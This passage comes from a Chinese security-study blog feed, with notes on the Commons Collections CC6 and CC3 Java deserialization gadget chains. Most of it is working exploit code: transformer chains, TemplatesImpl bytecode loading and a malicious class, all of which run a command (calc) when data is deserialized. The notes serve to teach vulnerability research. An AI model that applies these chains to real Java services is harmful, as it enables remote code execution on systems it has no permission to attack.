class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br></pre></td></tr></table></figure><p>根据我们的测试和URLDNS链的经验，我们知道调用put后，就执行了hash方法</p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC6%E9%93%BE.assets/image-20220807153446656.png" alt="image-20220807153446656"></p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC6%E9%93%BE.assets/image-20220810164345209.png" alt="image-20220810164345209"></p><p>如果没有删key，反序列化时进不了这个if（序列化时key也会被保存，反序列化时发现map中包含key，返回true）</p><h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a><strong>最终代码</strong></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//给lazyMap的factory传递一个别的，使其在put时先不执行</span></span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"><span class="comment">//因为在LazyMap.get()中，一但执行一次就会把这个key添加进去，我们需要删掉它</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//利用反射重新将chainedTransformer链加入lazymap</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">serialize(hashMap);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC6%E9%93%BE.assets/image-20220807161202629.png" alt="image-20220807161202629"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> cc链 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链学习笔记-CC3链</title>
      <link href="/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3%E9%93%BE/"/>
      <url>/2022/12/12/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>声明：本文为b站白日梦组长视频学习笔记，如有侵权，联系我速删</p><p>组长b站的传送门：<a href="https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0">https://space.bilibili.com/2142877265/?spm_id_from=333.999.0.0</a></p></blockquote><h1 id="一、挖掘CC3链"><a href="#一、挖掘CC3链" class="headerlink" title="一、挖掘CC3链"></a>一、挖掘CC3链</h1><img src="/images/CC链学习笔记-CC3.assets/image-20220911180428553.png" alt="image-20220911180428553" style="zoom:50%;"><blockquote><p>使用动态类加载执行代码</p></blockquote><p>我们了解到，ClassLoader在加载类时最后都会调用到defineClass(sink)，我们要找一个调用defineClass且是public的方法。(ClassLoader中重载了很多defineClss,我们需要寻找一个合适的)</p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3.assets/image-20220911110119114.png" alt="image-20220911110119114"></p><p>这里的defineClass也不是public的，只能被当前类调用，我们看一下在那里被调用的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TemplatesImpl</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">......</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                ......</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">            <span class="comment">// 这里还有初始化的操作，很不错</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">            ......</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们在TemplatesImpl沿着defineClass –&gt; defineTransletClasses –&gt; getTransletInstance  –&gt; newTransformer</p><p>终于找到了一个public的方法newTransformer(),并且意外收获是在getTransletInstance()方法中会把我们动态加载的恶意类进行初始化</p><blockquote><p>那接下来我们来测试一下从newTransformer()到defineClass()能不能正常执行</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TemplatesImpl</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//__name不能为空，否则直接返回null</span></span><br><span class="line">    <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//_class应该为空，然后调用defineTransletClasses方法</span></span><br><span class="line">    <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//_bytecodes不能为空，否则会抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">//_tfactory不能为空，否则会报空指针异常</span></span><br><span class="line">     AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">TransletClassLoader(...,_tfactory.getExternalExtensionsMap());&#125;</span><br><span class="line">      &#125;;</span><br><span class="line"><span class="comment">//这里执行到defineClass，_bytecodes应该就是我们要加载的恶意类的二进制数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i])</span><br><span class="line">    </span><br><span class="line"><span class="comment">//内部类，loader.defineClass就是这个类</span></span><br><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们主要到<code>_bytecodes</code>是一个二维数组，而defineClass类加载时只需要一维数组，我们观察到有一个for循环，会把我们传的<code>_bytecodes</code>循环加载进来，所以我们在一个一维数组放上我们的恶意类数组就好了 </p><blockquote><p>java中可以使用 int[] a &#x3D; {1,2,3,4,5};的方式构建数组</p><p>构造二维数组： int[][] arr &#x3D; { {1,2,3},{4,5,6},{7,8,9} };</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://Temp/classes/Test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>运行发现抛出了空指针异常错误</p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3.assets/image-20220911121528469.png" alt="image-20220911121528469"></p><p>动态调试时发现<code>_auxClasses</code>这里会报空指针异常，且<code>_transletIndex</code>为-1时也会报异常，所以我们要做的是进入第一个if分支，修改<code>_transletIndex</code>，所以我们的恶意类的父类应该为ABSTRACT_TRANSLET，即</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//恶意类</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="二、把CC1链前半段接过来-InvokerTransformer"><a href="#二、把CC1链前半段接过来-InvokerTransformer" class="headerlink" title="二、把CC1链前半段接过来(InvokerTransformer)"></a>二、把CC1链前半段接过来(InvokerTransformer)</h1><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3.assets/image-20220911182446213.png" alt="image-20220911182446213"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//我这里接的TransformedMap版本的，LayMap也行</span></span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://Temp/classes/Test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;v&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="三、InstantiateTransformer版本"><a href="#三、InstantiateTransformer版本" class="headerlink" title="三、InstantiateTransformer版本"></a>三、InstantiateTransformer版本</h1><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3.assets/image-20220911185549352.png" alt="image-20220911185549352"></p><blockquote><p>我们看到，InstantiateTransformer 所实现的 transform()方法允许我们通过反射实例化一个对象并且返回。</p><p>它会调用类的构造方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InstantiateTransformer</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们还可以再向前寻找一个调用newTransformer()方法的地方</p><p><img src="/images/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-CC3.assets/image-20220911183454625.png" alt="image-20220911183454625"></p><p>发现了TrAXFilter类，在他的构造方法中调用了newTransformer()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> TransformerImpl        _transformer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们注意，这个类并没有实现Serializable类，不能序列化，但是我们可以直接利用其构造方法，结合前面的InstantiateTransformer 类，构造出来一条<code>InstantiateTransformer.transform() --&gt; TrAXFilter.TrAXFilter --&gt; --&gt; TemplatesImpl.newTransformer()</code>这样一条链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//正常执行是：</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;).transform(TrAXFilter.class)</span><br></pre></td></tr></table></figure><h1 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a><strong>最终代码</strong></h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameFiled.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://Temp/classes/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里不需要了，因为readObject时会给_tfactory赋值</span></span><br><span class="line">        <span class="comment">//Field tfactoryFiled = tc.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;v&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span 